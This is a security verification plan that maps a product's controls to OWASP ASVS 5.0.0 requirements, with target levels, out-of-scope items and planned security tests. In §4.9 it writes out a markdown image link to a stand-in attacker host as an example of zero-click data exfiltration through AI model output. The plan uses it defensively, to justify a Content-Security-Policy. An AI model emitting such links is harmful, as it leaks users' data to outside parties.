# ASVS 5.0.0 Verification Plan — SDIP

**Deliverable:** closes open item 1 of `threat-model.md` §11 and the caveat on §8
**Date:** 2026-08-16
**Status:** Scoped. Requirement IDs are **verified against the standard's own machine-readable export**, not inferred.
**Pinned:** OWASP ASVS **5.0.0** — 17 chapters, 81 sections, **345 requirements** (L1 70 · L2 183 · L3 92)
**Provenance:** `OWASP_Application_Security_Verification_Standard_5.0.0_en.csv`, retrieved from the OWASP/ASVS repository on 2026-08-16 and counted locally. Counts in this document are computed from that file, not quoted from a summary.

**Vendored:** [`asvs-5.0.0.csv`](asvs-5.0.0.csv) · 105,100 bytes · `sha256:98c8fe911b9edb403af8ee05d3ce8201ecac2659e313b053890a62847cdcf680`
Vendored deliberately, per §6.3: a conformance baseline that is fetched at build time is a baseline that can change without a review. A 5.0.1 patch becomes a reviewed diff against this hash.

---

## 0. What this closes, and what it does not

`threat-model.md` §8 mapped SDIP's controls to ASVS **chapters** and explicitly refused to invent requirement-level IDs, because two circulating sources disagreed on the standard's structure and release year. That refusal is now discharged: the structure below is read off the standard itself.

Two things this does **not** close:

1. **A mapping is not a verification.** Every row in §4 is a claim that a requirement is addressed by a design; none of them is evidence that it is implemented, because nothing is implemented. §6 defines what evidence each row will need.
2. **Three of SDIP's most important controls still have no ASVS requirement to map to** (§5). That gap is a finding, not an omission, and it is the reason the LLM Top 10 2026 is pinned alongside.

---

## 1. Structure of the standard, as verified

| Chapter | Name | Reqs | L1 | L2 | L3 |
|---|---|---:|---:|---:|---:|
| V1 | Encoding and Sanitization | 30 | 8 | 19 | 3 |
| V2 | Validation and Business Logic | 13 | 4 | 7 | 2 |
| V3 | Web Frontend Security | 31 | 8 | 11 | 12 |
| V4 | API and Web Service | 16 | 2 | 8 | 6 |
| V5 | File Handling | 13 | 4 | 5 | 4 |
| V6 | Authentication | 47 | 13 | 22 | 12 |
| V7 | Session Management | 19 | 6 | 12 | 1 |
| V8 | Authorization | 13 | 4 | 3 | 6 |
| V9 | Self-contained Tokens | 7 | 4 | 3 | 0 |
| V10 | OAuth and OIDC | 36 | 5 | 24 | 7 |
| V11 | Cryptography | 24 | 3 | 11 | 10 |
| V12 | Secure Communication | 12 | 3 | 6 | 3 |
| V13 | Configuration | 21 | 1 | 12 | 8 |
| V14 | Data Protection | 13 | 2 | 7 | 4 |
| V15 | Secure Coding and Architecture | 21 | 3 | 10 | 8 |
| V16 | Security Logging and Error Handling | 17 | **0** | 16 | 1 |
| V17 | WebRTC | 12 | 0 | 7 | 5 |
| | **Total** | **345** | **70** | **183** | **92** |

The structural change from 4.0.3 that matters when reading older mappings: 4.0.3's V5 *Validation, Sanitization and Encoding* was split into 5.0's **V1 Encoding and Sanitization** and **V2 Validation and Business Logic**. Any inherited 4.0.3 mapping in this repository is therefore wrong by construction and must be re-derived, not translated.

### 1.1 L1 is not a meaningful floor for this product

Two facts from the table decide the target level before any policy discussion:

- **V16 Security Logging has zero L1 requirements.** An L1-conformant SDIP would have no logging requirements at all — for a system whose entire product claim is an auditable decision record.
- **V6 Password Security carries 8 of the 12 L1 requirements in its chapter**, and SDIP has no password store: authentication is delegated to the customer's IdP. An L1 assessment would be dominated by requirements that do not apply while omitting the ones that protect the product.

The requirements that actually defend SDIP — `V8.4.1` multi-tenancy, the whole of V16, `V13.3` secret management, `V14.2` data protection — are **L2 and above without exception.**

---

## 2. Target level

> **Baseline: ASVS 5.0.0 Level 2, plus a named set of L3 requirements adopted because SDIP's threat model demands them (§3).**

Level 2 is the defensible baseline for a SaaS processing another organization's security findings. Level 3 in full is not adopted: it carries 92 requirements including four chapters' worth of concerns (V15.4 concurrency at L3, V11.7 in-use data cryptography, most of V3's L3 frontend hardening) whose cost is not justified pre-revenue. **Selective adoption, argued per requirement, is more honest than an unachieved L3 claim** — and an unachieved claim is worse than a modest one, because it is discovered by an assessor rather than disclosed by us.

---

## 3. L3 requirements adopted above baseline

Each is adopted because a specific threat in `threat-model.md` makes it load-bearing. This list is the security posture's actual argument, and it is short on purpose.

| Requirement | What it requires | Why SDIP adopts it | Threat |
|---|---|---|---|
| **V8.3.2** | Changes to values on which authorization decisions are made are applied **immediately** | Revoking an analyst's `approver` role must take effect now, not at token expiry. A stolen analyst session is a mass-suppression capability | TH-45 |
| **V8.3.3** | Access is based on the **originating subject's** permissions, not on an intermediary's | Workers act on behalf of a tenant. A worker that carries its own authority is a cross-tenant path that RLS alone will not catch | TH-21, TH-27 |
| **V8.4.2** | Administrative interfaces incorporate multiple layers, incl. continuous identity verification | Operator boundary. **The most likely real-world cross-tenant path** | TH-38, TH-41 |
| **V13.1.4** | Documentation defines critical secrets and a rotation schedule | Tenant HMAC keys, audit signing keys, provider keys, ingest-token signing | TH-04, TH-33 |
| **V13.3.3** | Cryptographic operations performed in an **isolated security module** (vault/HSM) | `SecretRef` HMAC under per-tenant keys; audit chain signing. If the key is extractable, `SecretRef` degrades to a bare digest and low-entropy secrets are recoverable | TH-04 |
| **V13.3.4** | Secrets expire and rotate per documentation | Same | TH-04 |
| **V14.2.6** | Return only the **minimum required** sensitive data | The `no_code` default tier, applied at the API as well as at the prompt | TH-33 |
| **V14.2.7** | Retention classification with **automatic scheduled deletion** | This is `retention.md` §2 as an ASVS requirement. Adopting it makes the retention design testable rather than aspirational | TH-05, TH-34 |
| **V15.1.4** | Documentation highlights **"risky components"** | The eight ★ locations in `repository-structure.md` §1 | TH-46 |
| **V15.1.5** | Documentation highlights where **"dangerous functionality"** is used | Redaction boundary, context assembly, policy engine, session factory. Adopting this turns "review should be slowest here" from a norm into a requirement | TH-04, TH-08, TH-15 |
| **V15.2.4** | Dependencies come from the **expected repository**; no dependency-confusion risk | SDIP's own supply chain | TH-46 |
| **V15.2.5** | Additional protections around documented dangerous functionality | Pairs with V15.1.5; this is where MyPy-strict-on-redaction and the second-reviewer rule live | TH-04 |
| **V15.4.1** | Shared objects in multi-threaded code accessed via thread-safe types | Cache wrapper, connection factory | TH-22, TH-23 |
| **V15.4.2** | Check-and-act performed as a **single atomic operation** (TOCTOU) | **The audit chain tip.** Two concurrent writers reading the same `prev_hash` fork the chain, and a forked chain is an unverifiable chain | TH-19, TH-39 |
| **V16.3.2** (L3 clause) | Log **all** authorization decisions, incl. sensitive-data access, without logging the data | The audit record is the product. Logging only failures is insufficient for a decision-provenance claim | TH-19, TH-38 |
| **V16.5.4** | A last-resort handler catches all unhandled exceptions | Fail-closed is a domain invariant here: an unhandled exception in the analysis path must not become a silent non-decision | TH-14, TH-18 |

**16 L3 requirements adopted, of 92.** Everything else at L3 is deferred with the trigger stated in §7.

---

## 4. Mapping — SDIP control to requirement

Verified IDs. `→` indicates the SDIP artifact that will carry the evidence.

### 4.1 Tenant isolation (risk rank 2)

| Req | L | SDIP implementation |
|---|---|---|
| **V8.4.1** | 2 | **The single requirement that names multi-tenancy.** Composite `(org_id, id)` PKs, RLS + FORCE, non-owner app role → `database-model.md` §2 |
| V8.2.1 / V8.2.2 | 1 | Function- and data-level authorization; IDOR mitigation → role matrix in `api/README.md` §2.2 + RLS |
| V8.2.3 | 2 | Field-level restriction → `no_code` tier applied at serialization |
| V8.3.1 | 1 | Enforcement at a trusted service layer — org scope derived server-side from the session, never from a request field |
| **V8.3.2** | **3** | Role revocation applies immediately → server-side revocable sessions (not stateless JWT) |
| **V8.3.3** | **3** | Workers act with the originating tenant's scope → `SET LOCAL app.tenant_id` per unit of work |
| V8.1.1 / V8.1.2 | 1 / 2 | Authorization documentation → `api/README.md` §2 |
| V13.2.2 | 2 | Backend components use least-privilege accounts → `sdip_app` is not the owner |
| V14.2.2 | 2 | Data not cached in shared components, or securely purged → tenant-prefixed Redis keys, single wrapper |

### 4.2 Secrets and the redaction boundary (risk rank 3)

| Req | L | SDIP implementation |
|---|---|---|
| **V13.3.1** | 2 | Key vault for creation, storage, access control and **destruction** of secrets → also the mechanism behind crypto-shredding in `retention.md` §4.3 |
| V13.3.2 | 2 | Least privilege on secret assets → only `ingest` holds tenant credentials; `analyze` cannot reach the vault |
| **V13.3.3 / V13.3.4 / V13.1.4** | **3** | Isolated module, rotation, documented inventory → §3 |
| **V16.2.5** | 2 | **Logging enforced by the data's protection level — "it may not be allowed to log certain data".** This is the ASVS home for the prohibition on logging prompt content and payload bodies |
| V14.1.1 / V14.1.2 | 2 | Sensitive data identified and classified with documented protection requirements → `retention.md` §1 is this artifact |
| V13.4.2 / V13.4.6 | 2 / 3 | Debug modes off; no backend version disclosure |

### 4.3 Ingestion — untrusted payloads (risk rank 11)

| Req | L | SDIP implementation |
|---|---|---|
| V5.1.1 | 2 | Documented permitted types, extensions and **maximum size including unpacked size** → ADR-0005 hard caps |
| V5.2.3 | 2 | Compressed files checked against max uncompressed size and file count → the zip-bomb control |
| V5.2.4 | 3 | Per-user file quota → per-tenant ingest quota (deferred; see §7) |
| V5.3.3 | 3 | Server-side processing ignores user-provided path information → zip-slip; **relevant because SARIF `artifactLocation` is attacker-controlled** |
| V1.5.1 / V1.5.2 | 1 / 2 | Restrictive XML parser config; safe deserialization → SARIF/JSON parsers as untrusted-input parsers |
| V2.2.1 | 1 | Input validated to business expectations → canonical model validation |
| V15.2.2 | 2 | Defenses against loss of availability from resource-demanding functionality → admission control |
| V15.1.3 | 2 | Documentation identifies resource-demanding functionality → correlation blocking, reprocessing jobs |

### 4.4 API surface

| Req | L | SDIP implementation |
|---|---|---|
| V4.1.5 | 3 | Per-message digital signatures for high-value transactions → **deferred**; suppression uses step-up auth instead (§7) |
| V15.3.1 | 1 | Return only the required subset of fields |
| V15.3.3 | 2 | Mass-assignment countermeasures — allowed fields per action |
| V15.3.2 | 2 | Backend calls to external URLs do not follow redirects → feed fetching in `watch-worker` |
| **V13.2.4 / V13.2.5** | 2 | **Egress allowlist per component.** This is the ASVS home for the per-worker egress policy in `repository-structure.md` §4 |
| V16.5.1 | 2 | Generic error message; no internal data → RFC 9457 error hygiene, `api/README.md` §3 |
| V6.1.1 | 1 | Documented rate limiting and anti-automation |

### 4.5 Authentication, sessions, tokens

| Req | L | SDIP implementation |
|---|---|---|
| V6.8.1–V6.8.4 | 2 | Authentication with an identity provider; **assertion signature integrity always validated** |
| V10.1–V10.3, V10.5 | 2 | OAuth client / resource server / OIDC client — SDIP's actual role |
| V7.2.2 / V7.2.3 / V7.2.4 | 1 | Dynamically generated session tokens; CSPRNG; new token on re-authentication |
| V7.3.1 / V7.3.2 | 2 | Inactivity and absolute lifetime → ≤15-minute access tokens |
| **V7.5.1** | 2 | **Full re-authentication before sensitive modifications** → the step-up requirement on suppression creation |
| V7.4.1 | 1 | Termination disallows further use → server-side revocable refresh |
| V9.1.1 / V9.2.x | 1 / 2 | Self-contained token integrity and audience restriction → **applies to minted ingest tokens**, not only to IdP tokens |

### 4.6 Audit integrity (risk rank 10)

| Req | L | SDIP implementation |
|---|---|---|
| V16.1.1 | 2 | Log inventory: what is logged at each layer, format, where stored, how protected |
| V16.2.1 | 2 | when/where/who/what per entry → `audit_record.actor`, `subject_*`, `action`, `server_time` |
| V16.2.2 | 2 | Synchronized time sources, UTC → all `timestamptz`, plus TSA anchoring for external time |
| **V16.4.2** | 2 | **Logs protected from unauthorized access and cannot be modified** → `REVOKE UPDATE, DELETE, TRUNCATE`; hash chain; Merkle anchoring |
| V16.4.3 | 2 | Logs transmitted to a logically separate system → WORM export + continuous customer-controlled export (`retention.md` G10) |
| V16.4.1 | 2 | Encoding to prevent **log injection** → untrusted finding text is attacker-controlled and reaches log sinks |
| V16.3.1 / V16.3.3 / V16.3.4 | 2 | Authentication events; security-control bypass attempts; unexpected errors → **an attempt to suppress a KEV finding is a security event**, per `threat-model.md` §6 |
| **V16.3.2** | **3** | All authorization decisions logged |
| **V15.4.2** | **3** | Atomic check-and-act → the `audit_chain_tip` serialization |

### 4.7 Data protection and retention

| Req | L | SDIP implementation |
|---|---|---|
| V14.1.1 / V14.1.2 | 2 | Classification and per-level protection requirements → `retention.md` §1 |
| **V14.2.4** | 2 | Controls for encryption, integrity verification, **retention**, how data is logged, access controls in logs, privacy → the single requirement closest to `retention.md` as a whole |
| **V14.2.7** | **3** | **Automatic scheduled deletion** → partition `DETACH`+`DROP`, object lifecycle, D1–D4 |
| V14.2.3 | 2 | Sensitive data not sent to untrusted parties → **the model provider is a third party**; `no_code` and ZDR |
| V14.2.6 | 3 | Minimum necessary data returned |
| V11.1.1 | 2 | Documented key-management policy and lifecycle → per-tenant DEKs, crypto-shredding |
| V11.4.1 / V11.4.3 | 1 / 2 | Approved hash functions; collision-resistant hashes for integrity → SHA-256 chain, HMAC-SHA256 `SecretRef` |
| V12.1.x / V12.3.x | 1 / 2 | TLS everywhere including service-to-service |

### 4.8 Supply chain and architecture

| Req | L | SDIP implementation |
|---|---|---|
| V15.1.2 | 2 | **SBOM inventory; components from pre-defined trusted sources** |
| V15.1.1 / V15.2.1 | 1 | Documented remediation time frames, and adherence to them → SDIP must pass its own product's test |
| **V15.2.4** | **3** | Expected repository; no dependency-confusion risk → digest pinning |
| **V15.1.4 / V15.1.5 / V15.2.5** | **3** | Risky components and dangerous functionality documented and additionally protected → the eight ★ locations |
| V15.2.3 | 2 | Production contains no test code or sample snippets → **including evaluation fixtures**, which carry canaries |
| V13.4.1 | 1 | No source-control metadata deployed |

### 4.9 Frontend (Next.js UI)

Applied as standard: V3.2 (content interpretation), V3.3 (cookie setup), V3.4 (CSP and security headers), V3.5 (origin separation), V14.3 (client-side data protection). One item is product-specific and is **not** generic hardening:

| Req | L | SDIP implementation |
|---|---|---|
| **V3.4.3** | 2 | **Content-Security-Policy** → the enforcement point for "remote image loading disabled" in `reasoning_summary`. A `![](https://attacker/?q=…)` in model output is a zero-click exfiltration channel (TH-12), and CSP is what stops it rendering |

---

## 5. Not applicable — with the condition that re-scopes it

Marking a requirement N/A is a decision, not an omission, and each carries the change that would reverse it.

| Scope | Reqs | Why N/A | Re-scopes if |
|---|---:|---|---|
| **V17 WebRTC** (all) | 12 | No real-time media anywhere in the product | Never, plausibly |
| **V4.3 GraphQL** | 2 | REST only. `api/README.md` §5.2 bans a query DSL — *"a DSL over a security dataset is an injection surface and an unbounded-query surface"* | A GraphQL API is ever added |
| **V4.4 WebSocket** | 4 | No websockets in the MVP | Push notifications ship (`/v1/webhooks`, deferred) |
| **V6.2 Password Security** | 12 | No local password store; authentication delegated to the customer IdP | **Any local password path — including a break-glass admin login.** This is the most likely of these to quietly become applicable |
| **V6.4–V6.7** factor lifecycle, MFA, crypto auth | 20 | Owned by the customer's IdP. Becomes a **requirement on the customer**, stated in the security questionnaire, not on SDIP | SDIP ever authenticates a user directly |
| **V10.4 OAuth Authorization Server** | 16 | SDIP is a relying party and resource server, not an AS | SDIP issues OAuth tokens to third parties |
| **V10.6 OpenID Provider** | 2 | Same | Same |
| **V10.7 Consent Management** | 3 | No third-party app authorization surface | A partner/app ecosystem is built |
| **V11.4.2** password hashing KDF | 1 | No passwords stored | With V6.2 |
| | **72** | | |

**Applicable scope: 345 − 72 = 273 requirements**, of which 183 L2 minus the N/A L2s, plus the 16 adopted L3s. The exact per-level applicable count is computed by the harness in §6.3 rather than asserted here, because a hand-count of 273 rows is the kind of number that is wrong and never checked.

> **Watch V6.2.** "We have no passwords" is true today and is exactly the claim that becomes false the first time someone adds a break-glass local admin during an incident. A CI check asserting no local credential store exists is cheaper than re-scoping the assessment later.

---

## 6. Verification method

### 6.1 Evidence classes

| Class | Meaning | Acceptable evidence |
|---|---|---|
| **A — Automated test** | A test in `tests/security/` or `tests/contract/` fails if the requirement is violated | Test name + CI run |
| **B — Automated config/CI gate** | Enforced by a gate that blocks the build | Gate name (RLS migration gate, import-linter contract, MyPy strict, canary scan) |
| **C — Design artifact** | A documentation requirement, satisfied by a document | Document + section |
| **D — Manual review** | Reviewed per release by a named reviewer | Review record |

**Class C is the trap.** Roughly a fifth of ASVS 5.0's requirements are documentation requirements — V8.1, V13.1, V14.1, V15.1, V16.1, V2.1, V5.1, V6.1, V7.1, V11.1 are all "verify that the documentation defines…". They are cheap to satisfy and they are satisfied *by this repository*, which is a genuine argument for the documentation-first sequence CLAUDE.md §40 imposed. Where a class-C requirement can be upgraded to class A or B, it is.

### 6.2 The requirements that must be class A

These are not review items. If they are not tests, they are not controls.

| Req | Test |
|---|---|
| **V8.4.1** | GS-ISO: entire API suite as tenant A with tenant B resident; zero B rows in any response, error, log line, metric label or export |
| **V8.3.2** | Revoke `approver` mid-session; assert the next suppression attempt fails |
| **V8.3.3** | Worker executes with the originating tenant's scope; assert unset context returns zero rows, not an error |
| **V16.2.5** | Canary harness: no prompt content or payload body in any log sink |
| **V16.4.2** | Tamper test: modify an `audit_record`; assert `POST /v1/audit/verify` fails |
| **V15.4.2** | Concurrent audit appends for one org; assert no chain fork and no gap |
| **V14.2.7** | Partition drop and object-lifecycle assertions (`retention.md` §7 V1, V8) |
| **V5.2.3** | Zip bomb and nested-archive fixtures |
| **V5.3.3** | Zip-slip fixture with a traversal path in SARIF `artifactLocation` |
| **V16.4.1** | Log-injection fixture: newline and ANSI payloads in a finding's `rule_message` |
| **V13.2.4 / V13.2.5** | Egress allowlist assertion per worker process |
| **V15.2.3** | Assert no evaluation fixture or canary ships in a production image |

### 6.3 The harness

`eval/` already exists for AI gates; ASVS conformance is a separate, small harness under `tests/security/asvs/`:

- A checklist file keyed by requirement id, with `level`, `applicability`, `evidence_class`, `evidence_ref`, `status`.
- **Seeded from the standard's own CSV**, so a 5.0.1 patch is a diff rather than a re-read. The retrieved CSV is vendored with its content hash.
- CI asserts: no requirement is `applicable` with `status = unverified` past its due milestone; no requirement silently changes `applicability` without a reviewer.
- The report is generated, not written — a hand-maintained conformance table drifts within one release.

---

## 7. Deferred, with triggers

| Deferred | Why | Trigger |
|---|---|---|
| Full L3 (76 remaining) | Cost not justified pre-revenue; selective adoption argued in §3 | An enterprise deal requiring an L3 attestation |
| V4.1.5 per-message signatures | Step-up auth on suppression is the proportionate control today | A customer requires non-repudiation at the request level, not the record level |
| V5.2.4 per-user file quota | Per-tenant ingest quota exists (ADR-0005); per-user does not | Multi-user CI credentials appear |
| V11.7 in-use data cryptography | Confidential computing is not on the roadmap | A customer requires it in place of ZDR |
| V15.4.3 / V15.4.4 concurrency (locks, starvation) | Redis-backed workers on one Postgres; contention is not yet a security property | Worker fleet scale-out |
| V3 L3 frontend hardening (12) | The UI is internal-facing to authenticated analysts | Any unauthenticated or customer-embedded UI surface |

---

## 8. Status

| | Count |
|---|---:|
| Requirements in ASVS 5.0.0 | 345 |
| Not applicable to SDIP (§5) | 72 |
| **In scope** | **273** |
| In scope, **verified** | **0** — nothing is implemented |
| In scope, **mapped to a design artifact** | §4 |
| In scope, **assigned a class-A test** | 12 (§6.2) |

**Zero verified is the honest number and it must be reported as such.** A conformance claim before implementation is the failure mode this document exists to avoid, and it is the same failure mode as the vendor accuracy claims that `evaluation-system.md` §7 criticizes. The claim SDIP may make today is: *"ASVS 5.0.0 Level 2 plus 16 named L3 requirements, scoped and mapped, verification harness defined, zero requirements verified pending implementation."*

---

## 9. Remaining open items

1. **Re-verify against the released PDF.** The CSV export is authoritative for ids, levels and text; the PDF is authoritative for the level *definitions* and the assessment guidance. Retrieve it before any external attestation.
2. **Confirm 5.0.1 status.** The roadmap indicates a 5.0.1 patch rather than a 5.1. Re-run the §6.3 diff on release.
3. **CWE and NIST mappings.** The 5.0.0 export carries mapping columns not used here; if a customer asks for a CWE-indexed report, generate it from the same file rather than hand-authoring one.
4. **Assessor selection.** A self-assessment is what this document supports. A third-party L2 assessment is a separate cost, and the trigger is the first customer who asks for one in writing.
